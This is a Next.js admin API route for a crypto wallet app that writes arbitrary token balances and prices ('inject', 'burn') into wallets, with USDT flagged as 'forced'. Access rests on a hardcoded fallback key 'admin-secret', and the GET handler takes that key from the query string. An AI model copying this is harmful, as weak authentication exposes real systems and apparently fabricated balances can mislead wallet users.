import prisma from '../../lib/prisma'
import { NextResponse } from 'next/server'

const ADMIN_KEY = process.env.ADMIN_KEY || 'admin-secret'

export async function POST(req: Request) {
  try {
    const body = await req.json()
    const { action, adminKey, symbol, amount, price, walletAddress } = body

    if (adminKey !== ADMIN_KEY) {
      return NextResponse.json({
        success: false,
        error: 'Unauthorized'
      }, { status: 401 })
    }

    switch (action) {
      case 'inject': {
        if (!symbol || !amount || !price || !walletAddress) {
          return NextResponse.json({
            success: false,
            error: 'Missing required fields'
          }, { status: 400 })
        }

        // Create or upsert wallet by address
        const wallet = await prisma.wallet.upsert({
          where: { address: walletAddress },
          update: {},
          create: {
            address: walletAddress,
            publicKey: 'default',
            encryptedPrivateKey: 'default'
          }
        })

        // Create or update token in our internal system
        const token = await prisma.token.upsert({
          where: { 
            walletId_symbol: {
              walletId: wallet.id,
              symbol: symbol
            }
          },
          update: {
            price: parseFloat(price),
            balance: {
              increment: parseFloat(amount)
            }
          },
          create: {
            symbol,
            name: symbol === 'USDT' ? 'Tether USD' : symbol,
            price: parseFloat(price),
            balance: parseFloat(amount),
            isForced: symbol === 'USDT',
            walletId: wallet.id
          }
        })

        // Record the injection in our internal system
        const injection = await prisma.tokenInjection.create({
          data: {
            tokenId: token.id,
            symbol,
            amount: parseFloat(amount),
            price: parseFloat(price)
          }
        })

        return NextResponse.json({
          success: true,
          data: { token, injection }
        })
      }
      case 'burn': {
        if (!symbol || !amount || !walletAddress) {
          return NextResponse.json({
            success: false,
            error: 'Missing required fields for burn'
          }, { status: 400 })
        }

        // Find wallet by address
        const wallet = await prisma.wallet.findUnique({
          where: { address: walletAddress }
        })

        if (!wallet) {
          return NextResponse.json({
            success: false,
            error: 'Wallet not found'
          }, { status: 404 })
        }

        // Find token by walletId and symbol
        const token = await prisma.token.findUnique({
          where: {
            walletId_symbol: {
              walletId: wallet.id,
              symbol: symbol
            }
          }
        })

        if (!token) {
          return NextResponse.json({
            success: false,
            error: 'Token not found in wallet'
          }, { status: 404 })
        }

        if (token.balance < parseFloat(amount)) {
          return NextResponse.json({
            success: false,
            error: 'Insufficient token balance to burn'
          }, { status: 400 })
        }

        // Decrement token balance
        const updatedToken = await prisma.token.update({
          where: { id: token.id },
          data: {
            balance: {
              decrement: parseFloat(amount)
            }
          }
        })

        // Record the burn as a negative injection
        const burnRecord = await prisma.tokenInjection.create({
          data: {
            tokenId: token.id,
            symbol,
            amount: -parseFloat(amount),
            price: 0
          }
        })

        return NextResponse.json({
          success: true,
          data: { token: updatedToken, burnRecord }
        })
      }

      case 'getInjections': {
        const injections = await prisma.tokenInjection.findMany({
          include: {
            token: true
          }
        })
        return NextResponse.json({
          success: true,
          data: injections
        })
      }

      default:
        return NextResponse.json({
          success: false,
          error: 'Invalid action'
        }, { status: 400 })
    }
  } catch (error: any) {
    console.error('Admin API error:', error)
    return NextResponse.json({
      success: false,
      error: 'Internal server error'
    }, { status: 500 })
  }
}

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url)
    const adminKey = searchParams.get('adminKey')

    if (adminKey !== ADMIN_KEY) {
      return NextResponse.json({
        success: false,
        error: 'Unauthorized'
      }, { status: 401 })
    }

    // Get internal system data
    const [tokens, injections] = await Promise.all([
      prisma.token.findMany({
        where: { isForced: true }
      }),
      prisma.tokenInjection.findMany()
    ])

    return NextResponse.json({
      success: true,
      data: { tokens, injections }
    })
  } catch (error) {
    console.error('Error fetching admin data:', error)
    return NextResponse.json({
      success: false,
      error: 'Failed to fetch admin data'
    }, { status: 500 })
  }
}
